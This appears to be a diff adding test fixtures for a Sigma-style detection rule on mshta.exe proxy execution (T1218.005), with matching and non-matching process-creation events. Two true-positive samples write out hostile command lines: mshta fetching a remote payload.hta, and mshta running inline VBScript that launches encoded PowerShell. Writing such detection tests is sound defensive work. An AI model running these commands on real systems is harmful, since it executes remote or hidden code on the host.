@@ -1,0 +1,25 @@
+rule: defense_evasion/proc_creation_mshta_remote.yml
+atomic_test: T1218.005 / "Mshta executes JavaScript" and "Invoke HTML Application - Remote"
+true_positives:
+  - name: mshta pulls a remote hta
+    event:
+      EventID: 1
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: 'mshta.exe http://192.0.2.10/payload.hta'
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+  - name: mshta runs inline vbscript
+    event:
+      EventID: 1
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: 'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("powershell -enc ...")(window.close)'
+true_negatives:
+  - name: mshta launching a trusted local hta app
+    event:
+      EventID: 1
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: 'mshta.exe "C:\Program Files\Contoso\admin-console.hta"'
+  - name: unrelated process referencing a url
+    event:
+      EventID: 1
+      Image: 'C:\Program Files\Contoso\contoso.exe'
+      CommandLine: 'contoso.exe --update https://updates.contoso.com/latest'
